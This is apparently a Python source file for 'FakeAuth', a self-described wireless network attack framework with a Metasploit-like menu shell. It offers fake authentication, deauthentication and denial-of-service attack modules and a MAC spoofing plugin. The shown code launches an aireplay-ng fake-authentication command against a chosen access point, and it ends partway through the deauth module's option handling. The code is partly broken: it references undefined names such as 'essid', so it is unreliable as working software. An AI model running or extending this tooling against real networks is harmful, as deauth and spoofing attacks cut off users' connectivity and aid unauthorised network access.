import sys
import time
import subprocess
import fakeauthdeauth
from datetime import datetime
from colorama import Fore, Back

__author = "Scriptedp0ison"

class FakeAccessPointAuthentication:
	def __init__(self,banner, plugins, SOURCE_MAC, SECONDS, INTERFACE, BSSID, client_mac_deauth_auth, bssid_deauth_auth, channel_deauth_auth, packet_count_deauth_auth, interface_deauth_auth, plugin_check_mac, plugin_spoof_mac, plugin_monitor_mode, plugin_list, plugin_id, client_mac_dos_deauth, packet_count_dos_deauth, bssid_dos_deauth, channel_dos_deauth, interface_dos_deauth):
		self.banner = banner
		self.plugins = plugins
		self.source_mac = essid
		self.seconds = essid
		self.interface = essid
		self.bssid = bssid
		self.client_mac_deauth_auth = client_mac_deauth_auth
		self.bssid_deauth_auth = bssid_deauth_auth
		self.channel_deauth_auth = channel_deauth_auth
		self.packet_count_deauth_auth = packet_count_deauth_auth
		self.interface_deauth_auth = interface_deauth_auth
		self.plugin_check_mac = plugin_check_mac
		self.plugin_spoof_mac = plugin_spoof_mac
		self.plugin_monitor_mode = plugin_monitor_mode
		self.plugin_list = plugin_list
		self.plugin_id = plugin_id
		self.client_mac_dos_deauth = client_mac_dos_deauth
		self.packet_count_dos_deauth = packet_count_dos_deauth
		self.bssid_dos_deauth = bssid_dos_deauth
		self.channel_dos_deauth = channel_dos_deauth
		self.interface_dos_deauth = interface_dos_deauth


	#exec_sys = 0
	fakeauth_comm = ['help', '?', 'banner', 'show banner', 'show plugins', 'show attacks', 'show payloads', 'exit',
				'quit', 'leave', 'back', 'get banner']
	@classmethod
	def fakeauth_banner(cls):
		print(Fore.BLUE+""" 
# cowsay++
____________
< fakeauth >
------------
       \   ,__,
        \  (oo)____
           (__)    )\ \n              ||--|| *
              
		\033[0;m""")
		print(Fore.GREEN+"FakeAuth\033[0;m"+" - Network attack framework made with "+Fore.RED+"poison\033[0;m\n")
		
		print("        =[ "+Fore.YELLOW+"fakeauth v1.6.9 BETA\033[0;m"+"     ]")
		print("+ --  --=[ "+Fore.GREEN+"4\033[0;m"+" network attack vectors ]")
		print("+ --  --=[ "+Fore.GREEN+"0\033[0;m"+" network payloads       ]")
		print("+ --  --=[ "+Fore.GREEN+"4\033[0;m"+" network plugins        ]\n")
			

	plugins = 0
	plugin_check_mac = False
	plugin_spoof_mac = False
	plugin_monitor_mode = False
	plugins_list = []
	plugin_id = 0
	@classmethod
	def fakeauth(self):
		allow_exec = False
		try:
			fakeauth_ap = raw_input('faf>')
			fakeauth_index = list(fakeauth_ap.split(" "))
			if fakeauth_ap == "help" or fakeauth_ap == "?":
				print("""
Core Commands
=======================

\tCommands                Description
\t-------------------	--------------------
\tshow attacks		Display the current available network attacks
\tshow payloads		Display payloads to carry across a vulnerable network
\tshow plugins		Display plugins to use within the fakeauth framework
\tinfo			Display info on a certain payload, plugin or attack
\texit			Exit the fakeauth network toolkit framework
				""")
				del fakeauth_index
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "":
				del fakeauth_index
				FakeAccessPointAuthentication.fakeauth()

			elif fakeauth_ap == "show attacks":
				del fakeauth_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attacks...')
				time.sleep(3)
				print(""" 
Network Attacks			Module					Description
------------------		---------				-------------
Fake Authentication Attack	fakeauth/network/fake_auth      	Perform a fake authentication attack
Fake Auth Deauth Attack		fakeauth/network/deauth/fake_auth	Fake authenticate and deauthenticate
Deauthentication Attack		fakeauth/network/dos/deauth		Denial of Service Deauth Attack
Deauth Time Attack		fakeauth/network/dos/time/deauth	Denial of Service Time Deauth Attack
				""")
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "clear":
				del fakeauth_index
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "exit" or fakeauth_ap == "quit" or fakeauth_ap == "leave":
				del fakeauth_index
				print('['+Fore.RED+'*\033[0;m'+'] Exitting the fakeauth network attack framework...')
				time.sleep(3)
				exit()
			elif fakeauth_ap == "exit now":
				del fakeauth_index
				exit()
			elif fakeauth_ap == "show payloads":
				del fakeauth_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attack payloads...')
				time.sleep(3)
				print("""
Network Payloads		Module					Description
----------------		--------				-------------
0::display			0::display				0::display
				""")
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "banner" or fakeauth_ap == "get banner" or fakeauth_ap == "show banner":
				del fakeauth_index
				print(Fore.BLUE+'[*]\033[0;m'+' Executing banner...')
				time.sleep(3)
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fakeauth_banner()
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "show plugins":
				del fakeauth_index
				print(Fore.GREEN+'[*]\033[0;m'+' Getting network plugins...')
				time.sleep(3)
				print("""
Network Plugins			Module					Description
----------------		-------					------------
System Commands			fakeauth/system/exec/system_commands	Execute system commands from fakeauth
Check MAC Status		fakeauth/system/check/mac_address	Check the current system mac address
Spoof MAC Address		fakeauth/system/spoof/mac_address	Spoof the curent system mac address
Enable Monitor Mode		fakeauth/system/enable/monitor_mode	Enable monitor mode on a system iface
				""")
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "use fakeauth/network/fake_auth":
				del fakeauth_index
				#create this function after listing of others
				FakeAccessPointAuthentication.fake_auth_network_attack() #created
			elif fakeauth_ap == "use fakeauth/network/deauth/fake_auth":
				del fakeauth_index
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_ap == "use fakeauth/network/dos/deauth":
				del fakeauth_index
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack() 
			elif fakeauth_ap == "use fakeauth/network/dos/deauth":
				del fakeauth_index
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			#conditions for network plugins
			elif fakeauth_ap == "enable plugin fakeauth/system/exec/system_commands":
				del fakeauth_index
				FakeAccessPointAuthentication.fake_auth_plugin_exec_sys_commands() # not available
			#set the plugins counter up 1 and the plugin_check to true or 1
#-------------------------------------------------------------------------------------------------------------------------------
			elif fakeauth_ap == "enable plugin fakeauth/system/check/mac_address":
				if self.plugin_check_mac == True:
					print("ERROR: Cannot load fakeauth/system/check/mac_address. Plugin already loaded")
					FakeAccessPointAuthentication.fakeauth()
				else:
					del fakeauth_index
					self.plugins+=1
					self.plugin_id+=1
					self.plugin_check_mac = True
					loaded_check_mac = ("Plugin: fakeauth/system/check/mac_address Loaded: %s Id: %s" % (self.plugin_check_mac, self.plugins))
					self.plugins_list.append("%s" % loaded_check_mac)
					print(Fore.GREEN+'[+]\033[0;m Loading plugin fakeauth/system/check/mac_address...')
					time.sleep(2)
					print("Loaded plugin => fakeauth/system/check/mac_address with id => %s" % (self.plugins))
			elif fakeauth_ap == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del fakeauth_index
				time.sleep(1)
				subprocess.call("/root/check_spoof.sh", shell=True)
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac != True:
				del fakeauth_index
				time.sleep(1)
				print("ERROR => You must first enable the plugin fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del fakeauth_index
				self.plugins-=1
				self.plugin_id-=1
				plugin_interact = "fakeauth/system/check/mac_address"
				self.plugin_check_mac = False
				self.plugins_list = []
				time.sleep(1)
				print("Disabled plugin => fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == False:
				del fakeauth_index
				time.sleep(1)
				print("ERROR => You cannot disable the plugin fakeauth/system/check/mac_address. It was never loaded")
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "list plugins_loaded":
				del fakeauth_index
				print(self.plugins)
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_ap == "show plugins_loaded":
				print("%s" % (self.plugins_list))
				FakeAccessPointAuthentication.fakeauth()
				del fakeauth_index
			elif fakeauth_ap == "show plugins_loaded" and self.plugins_list is None:
				print("No plugins loaded none to show")
				FakeAccessPointAuthentication.fakeauth()
				del fakeauth_index
			#interact with plugins
			elif fakeauth_index[0] == "interact" and fakeauth_index[1] == "with_plugin_id":
				if fakeauth_index[2] != None:
					time.sleep(1)
					print("Interacting with plugin id => %s" % fakeauth_index[2])
					time.sleep(2)
					del fakeauth_index
						
#-------------------------------------------------------------------------------------------------------------------------------------
			elif fakeauth_ap == "enable plugin fakeauth/system/spoof/mac_address":
				del fakeauth_index
				FakeAccessPointAuthentication.fake_auth_spoof_mac_address() # not available
			elif fakeauth_ap == "enable plugin fakeauth/system/enable/monitor_mode":
				del fakeauth_index
				FakeAccessPointAuthentication.fake_auth_enable_monitor_mode() # not available
			else:
				del fakeauth_index
				print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown option \"%s\"...' % fakeauth_ap)
				time.sleep(.5)
				FakeAccessPointAuthentication.fakeauth()
		except KeyboardInterrupt:
			print('Interrupt: use the \"exit\" command to quit')
			FakeAccessPointAuthentication.fakeauth()
		else:
			FakeAccessPointAuthentication.fakeauth()
			
	bssid = None
	seconds = 0
	source_mac = None
	interface = None
	
	@classmethod	
	def fake_auth_network_attack(self):
		try:
			net_fakeauth = raw_input('faf fakeauth'+"("+Fore.RED+"fake_auth\033[0;m"+") > ")
			net_index = list(net_fakeauth.split(" "))
			if net_fakeauth == "help" or net_fakeauth == "?":
				print("""
Core Commands
=======================

\tCommands                Description
\t-------------------	--------------------
\tshow attacks		Display the current available network attacks
\tshow payloads		Display payloads to carry across a vulnerable network
\tshow plugins		Display plugins to use within the fakeauth framework
\tshow options		Display options for the current network attack vector
\tinfo			Display info on a certain payload, plugin or attack
\texit			Exit the fakeauth network toolkit framework
				""")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "":
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "show attacks":
				del net_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attacks...')
				time.sleep(3)
				print(""" 
Network Attacks			Module					Description
------------------		---------				-------------
Fake Authentication Attack	fakeauth/network/fake_auth      	Perform a fake authentication attack
Fake Auth Deauth Attack		fakeauth/network/deauth/fake_auth	Fake authenticate and deauthenticate
Deauthentication Attack		fakeauth/network/dos/deauth		Denial of Service Deauth Attack
Deauth Time Attack		fakeauth/network/dos/time/deauth	Denail of Service Time Deauth Attack
				""")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "clear":
				del net_index
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "exit" or net_fakeauth == "quit" or net_fakeauth == "leave":
				del net_index
				print('['+Fore.RED+'*\033[0;m'+'] Exitting the fakeauth network attack framework...')
				time.sleep(3)
				exit()
			elif net_fakeauth == "exit now":
				exit()
			elif net_fakeauth == "show payloads":
				del net_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attack payloads...')
				time.sleep(3)
				print("""
Network Payloads		Module					Description
----------------		--------				-------------
0::display			0::display				0::display
			""")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "banner" or net_fakeauth == "get banner" or net_fakeauth == "show banner":
				del net_index
				print(Fore.BLUE+'[*]\033[0;m'+' Executing banner...')
				time.sleep(3)
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fakeauth_banner()
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "show plugins":
				del net_index
				print(Fore.GREEN+'[*]\033[0;m'+' Getting network plugins...')
				time.sleep(3)
				print("""
Network Plugins			Module					Description
----------------		-------					------------
System Commands			fakeauth/system/exec/system_commands	Execute system commands from fakeauth
Check MAC Status		fakeauth/system/check/mac_address	Check the current system mac address
Spoof MAC Address		fakeauth/system/spoof/mac_address	Spoof the curent system mac address
Enable Monitor Mode		fakeauth/system/enable/monitor_mode	Enable monitor mode on a system iface
				""")
			elif net_fakeauth == "back":
				del net_index
				FakeAccessPointAuthentication.fakeauth()
			elif net_fakeauth == "use fakeauth/network/fake_auth":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "use fakeauth/network/deauth/fake_auth":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "use fakeauth/network/dos/deauth":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "use fakeauth/network/dos/deauth":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			#conditions for network plugins
			elif net_fakeauth == "enable plugin fakeauth/system/exec/system_commands":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "enable plugin fakeauth/system/check/mac_address":
				if self.plugin_check_mac == True:
					print("ERROR: Cannot load fakeauth/system/check/mac_address. Plugin already loaded")
					FakeAccessPointAuthentication.fake_auth_network_attack()
				else:
					del net_index
					self.plugins+=1
					self.plugin_id+=1
					self.plugin_check_mac = True
					loaded_check_mac = ("Plugin: fakeauth/system/check/mac_address Loaded: %s Id: %s" % (self.plugin_check_mac, self.plugins))
					self.plugins_list.append("%s" % loaded_check_mac)
					print(Fore.GREEN+'[+]\033[0;m Loading plugin fakeauth/system/check/mac_address...')
					time.sleep(2)
					print("Loaded plugin => fakeauth/system/check/mac_address with id => %s" % (self.plugins))
			elif net_fakeauth == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del net_index
				time.sleep(1)
				subprocess.call("/root/check_spoof.sh", shell=True)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac != True:
				del net_index
				time.sleep(1)
				print("ERROR => You must first enable the plugin fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del net_index
				self.plugins-=1
				self.plugin_id-=1
				plugin_interact = "fakeauth/system/check/mac_address"
				self.plugin_check_mac = False
				self.plugins_list = []
				time.sleep(1)
				print("Disabled plugin => fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == False:
				del net_index
				time.sleep(1) 
				print("ERROR => You cannot disable the plugin fakeauth/system/check/mac_address. It was never loaded")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "list plugins_loaded":
				del net_index
				print(self.plugins)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "show plugins_loaded":
				del net_index
				print("%s" % (self.plugins_list))
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "show plugins_loaded" and self.plugins_list is None:
				del net_index
				print("No plugins loaded none to show")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			#interact with plugins
			elif net_fakeauth[0] == "interact" and net_index[1] == "with_plugin_id":
				if net_index[2] != None:
					time.sleep(1)
					print("Interacting with plugin id => %s" % net_index[2])
					time.sleep(2)
					del net_index
					FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_index == "enable plugin fakeauth/system/spoof/mac_address":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_index == "enable plugin fakeauth/system/enable/monitor_mode":
				del net_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % net_fakeauth)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "show options":
				print("""
Network attack options (fakeauth/network/fake_auth):\n
\tName	    \tCurrent setting \tRequired \tDescription		
\t-----	    \t--------------- \t-------- \t-----------
\tSOURCE_MAC\t%s              \tyes      \tSource mac address to use with transaction
\tSECONDS   \t%s              \t\tyes      \tThe amount of time in (seconds) to run the attack
\tBSSID     \t%s              \tyes      \tThe wireless mac address of the access point
\tINTERFACE \t%s	      \t\tyes	   \tThe wireless interface needed to execute the attack

				""" % (self.source_mac, self.seconds, self.bssid, self.interface))
				del net_index
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_index[0] == "set":
				#net_index = list(net_fakeauth.split(" "))
				if len(net_index) == 3:
					if net_index[1] == "ESSID" or net_index[1] == "essid":
						self.essid = str(net_index[2])
						print(net_index[1]+" => "+net_index[2])
						del net_index
						FakeAccessPointAuthentication.fake_auth_network_attack()
					elif net_index[1] == "SOURCE_MAC" or net_index[1] == "source_mac":
						self.source_mac = str(net_index[2])
						if len(self.source_mac) != 17:
							print("ERROR: Source address must have a character length of 17")
							self.source_mac = None
							FakeAccessPointAuthentication.fake_auth_network_attack()
						else:
							print(net_index[1]+" => "+net_index[2])
							del net_index
							FakeAccessPointAuthentication.fake_auth_network_attack()
					elif net_index[1] == "SECONDS" or net_index[1] == "seconds":
						self.seconds = int(net_index[2])
						if self.seconds == 0:
							print("ERROR: Cannot set timeout seconds to 0")
							self.seconds = 0
							FakeAccessPointAuthentication.fake_auth_network_attack()
						else:
							print(net_index[1]+" => "+net_index[2])
							del net_index
							FakeAccessPointAuthentication.fake_auth_network_attack()
					elif net_index[1] == "BSSID" or net_index[1] == "bssid":
						self.bssid = str(net_index[2])
						if len(self.bssid) != 17:
							print("ERROR: Target address must have a character length of 17")
							self.bssid = None
							FakeAccessPointAuthentication.fake_auth_network_attack()
						else:
							print(net_index[1]+" => "+net_index[2])
							del net_index
							FakeAccessPointAuthentication.fake_auth_network_attack()
					elif net_index[1] == "INTERFACE" or net_index[1] == "interface":
						self.interface = str(net_index[2])
						print(net_index[1]+" => "+net_index[2])
						del net_index
						FakeAccessPointAuthentication.fake_auth_network_attack()
					elif net_index[1] != "ESSID" or net_index[1] != "SOURCE_MAC" or net_index[1] != "SECONDS" or net_index[1] != "BSSID":
						print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown parameter \"%s\"...' % net_index[1])
						
				time.sleep(.5)
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "run" and self.source_mac == None and self.seconds == 0 and self.bssid == None and self.interface == None:
				print("ERROR: Nothing was set")
				FakeAccessPointAuthentication.fake_auth_network_attack()
			elif net_fakeauth == "run" and len(self.source_mac) == 17 and len(self.bssid) == 17 and self.interface != None and self.seconds != 0:
				try:
					print("Executing fake authentication attack! Suppressing output! Press ctrl+c to the cancel attack...")
					subprocess.call(("aireplay-ng -1 %s -a %s -h %s %s" % (self.seconds, self.bssid, self.source_mac, self.interface)), shell=True, stdout=subprocess.PIPE)
					print("Fake authentication attack complete. Finished 100%")
					time.sleep(2)
					FakeAccessPointAuthentication.fake_auth_network_attack()
				except KeyboardInterrupt:
					print("Stopping fake authentication attack...")
					time.sleep(3)
					FakeAccessPointAuthentication.fake_auth_network_attack()
				else:
					print("ERROR: Attack not completed")
					FakeAccessPointAuthentication.fake_auth_network_attack()
					

			else:
				print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown option \"%s\"...' % net_fakeauth)
				time.sleep(.5)
				FakeAccessPointAuthentication.fake_auth_network_attack()
		except KeyboardInterrupt:
			print('Interrupt: use the \"exit\" command to quit')
			FakeAccessPointAuthentication.fake_auth_network_attack()
		else:
			FakeAccessPointAuthentication.fake_auth_network_attack()
			
	client_mac_deauth_auth = None
	bssid_deauth_auth = None
	channel_deauth_auth = None
	packet_count_deauth_auth = None 
	interface_deauth_auth = None
	
	@classmethod
	def fakeauth_deauth_attack(self):
		try:
			fakeauth_input = raw_input('faf fakeauth'+"("+Fore.RED+"fake_auth/deauth\033[0;m"+") > ")
			deauth_index = list(fakeauth_input.split(" "))
			if fakeauth_input == "help" or fakeauth_input == "?":
				print("""
Core Commands
=======================

\tCommands                Description
\t-------------------	--------------------
\tshow attacks		Display the current available network attacks
\tshow payloads		Display payloads to carry across a vulnerable network
\tshow plugins		Display plugins to use within the fakeauth framework
\tshow options		Display options for the current network attack vector
\tinfo			Display info on a certain payload, plugin or attack
\texit			Exit the fakeauth network toolkit framework
				""")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			if fakeauth_input == "":
				del deauth_index
				FakeAccessPointAuthentication.fakeauth_deauth_attack()

			elif fakeauth_input == "show attacks":
				del deauth_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attacks...')
				time.sleep(3)
				print(""" 
Network Attacks			Module					Description
------------------		---------				-------------
Fake Authentication Attack	fakeauth/network/fake_auth      	Perform a fake authentication attack
Fake Auth Deauth Attack		fakeauth/network/deauth/fake_auth	Fake authenticate and deauthenticate
Deauthentication Attack		fakeauth/network/dos/deauth		Denial of Service Deauth Attack
Deauth Time Attack		fakeauth/network/dos/time/deauth	Denial of Service Time Deauth Attack
				""")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "clear":
				del deauth_index
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "exit" or fakeauth_input == "quit" or fakeauth_input == "leave":
				del deauth_index
				print('['+Fore.RED+'*\033[0;m'+'] Exitting the fakeauth network attack framework...')
				time.sleep(3)
				exit()
			elif fakeauth_input == "exit now":
				exit()
			elif fakeauth_input == "show payloads":
				del deauth_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attack payloads...')
				time.sleep(3)
				print("""
Network Payloads		Module					Description
----------------		--------				-------------
0::display			0::display				0::display
				""")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "banner" or fakeauth_input == "get banner" or fakeauth_input == "show banner":
				del deauth_index
				print(Fore.BLUE+'[*]\033[0;m'+' Executing banner...')
				time.sleep(3)
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fakeauth_banner()
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "show plugins":
				del deauth_index
				print(Fore.GREEN+'[*]\033[0;m'+' Getting network plugins...')
				time.sleep(3)
				print("""
Network Plugins			Module					Description
----------------		-------					------------
System Commands			fakeauth/system/exec/system_commands	Execute system commands from fakeauth
Check MAC Status		fakeauth/system/check/mac_address	Check the current system mac address
Spoof MAC Address		fakeauth/system/spoof/mac_address	Spoof the curent system mac address
Enable Monitor Mode		fakeauth/system/enable/monitor_mode	Enable monitor mode on a system iface
				""")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "use fakeauth/network/fake_auth":
				del deauth_index
				#create this function after listing of others
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_input)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "use fakeauth/network/deauth/fake_auth":
				del deauth_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_input)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "use fakeauth/network/dos/deauth":
				del deauth_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_input)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "use fakeauth/network/dos/deauth":
				del deauth_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_input)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			#conditions for network plugins
			elif fakeauth_input == "enable plugin fakeauth/system/exec/system_commands":
				del deauth_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % fakeauth_deauth)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "enable plugin fakeauth/system/check/mac_address":
				if self.plugin_check_mac == True:
					print("ERROR: Cannot load fakeauth/system/check/mac_address. Plugin already loaded")
					FakeAccessPointAuthentication.fake_auth_network_attack()
				else:
					del deauth_index
					self.plugins+=1
					self.plugin_id+=1
					self.plugin_check_mac = True
					loaded_check_mac = ("Plugin: fakeauth/system/check/mac_address Loaded: %s Id: %s" % (self.plugin_check_mac, self.plugins))
					self.plugins_list.append("%s" % loaded_check_mac)
					print(Fore.GREEN+'[+]\033[0;m Loading plugin fakeauth/system/check/mac_address...')
					time.sleep(2)
					print("Loaded plugin => fakeauth/system/check/mac_address with id => %s" % (self.plugins))
					FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del deauth_index
				time.sleep(1)
				subprocess.call("/root/check_spoof.sh", shell=True)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac != True:
				del deauth_index
				time.sleep(1)
				print("ERROR => You must first enable the plugin fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del deauth_index
				self.plugins-=1
				self.plugin_id-=1
				plugin_interact = "fakeauth/system/check/mac_address"
				self.plugin_check_mac = False
				self.plugins_list = []
				time.sleep(1)
				print("Disabled plugin => fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == False:
				del deauth_index
				time.sleep(1)
				print("ERROR => You cannot disable the plugin fakeauth/system/check/mac_address. It was never loaded")
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "list plugins_loaded":
				del deauth_index
				print(self.plugins)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "show plugins_loaded":
				print("%s" % (self.plugins_list))
				del deauth_index
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "show plugins_loaded" and self.plugins_list is None:
				print("No plugins loaded none to show")
				del deauth_index
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			#interact with plugins
			elif deauth_index[0] == "interact" and deauth_index[1] == "with_plugin_id":
				if deauth_index[2] != None:
					time.sleep(1)
					print("Interacting with plugin id => %s" % deauth_index[2])
					time.sleep(2)
					del deauth_index
					FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "enable plugin fakeauth/system/spoof/mac_address":
				del deauth_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % fakeauth_deauth)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "enable plugin fakeauth/system/enable/monitor_mode":
				del deauth_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % fakeauth_deauth)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "back":
				del deauth_index
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_input == "show options":
				del deauth_index
				print("""
Network attack options (fakeauth/network/deauth/fake_auth):\n
\tName	    \tCurrent setting \tRequired \tDescription		
\t-----	    \t--------------- \t-------- \t-----------
\tCLIENT_MAC\t%s              \tno       \tThe client address on the network to deauthenticate
\tPACKET_COUNT\t%s            \tyes    \t\tThe amount of packets to send across the network
\tBSSID     \t%s              \tyes      \tThe wireless mac address of the access point
\tCHANNEL   \t%s              \tyes    \t\tThe channel to listen on
\tINTERFACE \t%s	      \t\tyes	 \tThe wireless interface needed to execute the attack
				""" % (self.client_mac_deauth_auth, self.packet_count_deauth_auth, self.bssid_deauth_auth, self.channel_deauth_auth, self.interface_deauth_auth))
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif deauth_index[0] == "set":
				#net_index = list(net_fakeauth.split(" "))
				if len(deauth_index) == 3:
					if deauth_index[1] == "CLIENT_MAC" or deauth_index[1] == "client_mac":
						self.client_mac_deauth_auth = str(deauth_index[2])
						if len(self.client_mac_deauth_auth) != 17:
							print("ERROR: Client address must have a character length of 17")
							self.client_mac_deauth_auth = None
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
						else:
							print(deauth_index[1]+" => "+deauth_index[2])
							del deauth_index
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
							
					elif deauth_index[1] == "PACKET_COUNT" or deauth_index[1] == "packet_count":
						self.packet_count_deauth_auth = int(deauth_index[2])
						if self.packet_count_deauth_auth == 0:
							print("ERROR: Cannot set unlimited frame injection")
							self.packet_count_deauth_auth = None
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
						else:
							print(deauth_index[1]+" => "+deauth_index[2])
							del deauth_index
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
							
					elif deauth_index[1] == "BSSID" or deauth_index[1] == "bssid":
